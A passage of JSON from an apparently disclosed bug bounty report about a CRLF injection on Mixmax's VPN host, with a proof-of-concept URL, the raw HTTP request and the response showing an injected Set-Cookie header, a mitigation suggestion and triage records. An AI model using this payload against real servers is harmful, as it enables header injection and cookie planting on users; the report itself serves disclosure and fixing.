mments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hey guys,\n\nI found that the site https://vpn.mixmax.com is vulnerable to a CRLF Injection.\n\nBy injecting a  Carriage Return and Line Feed character, we are able to make the server issue a set-cookie header.\n\n\nProof-of-Concept:\n==============\n\n```\nhttps://vpn.mixmax.com/__session_start__/%0aSet-Cookie:malicious_cookie1\n````\r\n\nRequest:\n-----------\n```\nGET /__session_start__/%0aSet-Cookie:malicious_cookie1 HTTP/1.1\nHost: vpn.mixmax.com\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nCookie: openvpn_sess_e3c6c988cb5e4729bb261cf849082d71=9fbd7613d1b7f33d5717bcc33739caa1\nConnection: close\n```\nResponse:\n------------\n```\nHTTP/1.1 302 Found\nDate: Wed, 31 May 2017 07:38:50 GMT\nConnection: close\nContent-Type: text/html; charset=UTF-8\nLocation: https://vpn.mixmax.com/\nSet-Cookie:malicious_cookie1\nServer: OpenVPN-AS\nContent-Length: 59\n\n\n\u003chtml\u003e\n    \u003cbody\u003e\n    \u003cp\u003eREDIRECT\u003c/p\u003e\n    \u003c/body\u003e\n\u003c/html\u003e\n```\nAs can be seen in the response, the server will issue a Set-Cookie header with an arbitrary value and that cookie will be set on the client.\n\nTo mitigate this issue, the application should strip out any input which contains the %0d%0a URL encoded characters.","vulnerability_information_html":"\u003cp\u003eHey guys,\u003c/p\u003e\n\n\u003cp\u003eI found that the site \u003ca title=\"https://vpn.mixmax.com\" href=\"/redirect?url=https%3A%2F%2Fvpn.mixmax.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://vpn.mixmax.com\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e is vulnerable to a CRLF Injection.\u003c/p\u003e\n\n\u003cp\u003eBy injecting a  Carriage Return and Line Feed character, we are able to make the server issue a set-cookie header.\u003c/p\u003e\n\n\u003ch1 id=\"proof-of-concept\"\u003eProof-of-Concept:\u003c/h1\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ehttps://vpn.mixmax.com/__session_start__/%0aSet-Cookie:malicious_cookie1\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"request\"\u003eRequest:\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eGET /__session_start__/%0aSet-Cookie:malicious_cookie1 HTTP/1.1\nHost: vpn.mixmax.com\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nCookie: openvpn_sess_e3c6c988cb5e4729bb261cf849082d71=9fbd7613d1b7f33d5717bcc33739caa1\nConnection: close\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"response\"\u003eResponse:\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003eHTTP/1.1 302 Found\nDate: Wed, 31 May 2017 07:38:50 GMT\nConnection: close\nContent-Type: text/html; charset=UTF-8\nLocation: https://vpn.mixmax.com/\nSet-Cookie:malicious_cookie1\nServer: OpenVPN-AS\nContent-Length: 59\n\n\n\u003cspan class=\"nt\"\u003e\u0026lt;html\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;body\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;p\u0026gt;\u003c/span\u003eREDIRECT\u003cspan class=\"nt\"\u003e\u0026lt;/p\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;/body\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/html\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAs can be seen in the response, the server will issue a Set-Cookie header with an arbitrary value and that cookie will be set on the client.\u003c/p\u003e\n\n\u003cp\u003eTo mitigate this issue, the application should strip out any input which contains the %0d%0a URL encoded characters.\u003c/p\u003e\n","weakness":{"id":69,"name":"CRLF Injection"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2017-07-06T14:56:04.676Z","allow_singular_disclosure_after":-109865419.01454857,"singular_disclosure_allowed":true,"vote_count":8,"voters":["gamliel","eveeez","b3nac","japz","wragg-s","sumit7","sa1tama0","spetr0x"],"severity":{"rating":"low","author_type":"Team"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1715289,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thanks, will fix!","markdown_message":"\u003cp\u003eThanks, will fix!\u003c/p\u003e\n","automated_response":false,"created_at":"2017-05-31T08:34:59.334Z","updated_at":"2017-05-31T08:34:59.334Z","actor":{"username":"wearhere","cleared":false,"url":"/wearhere","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"mixmax","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1734665,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2017-06-06T13:19:57.307Z","updated_at":"2017-06-06T13:19:57.307Z","additional_data":{"old_severity":"Medium","new_severity":"Low","old_severity_id":46707,"new_severity_id":48836},"actor":{"username":"tr3y","cleared":false,"url":"/tr3y","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"mixmax","actor_is_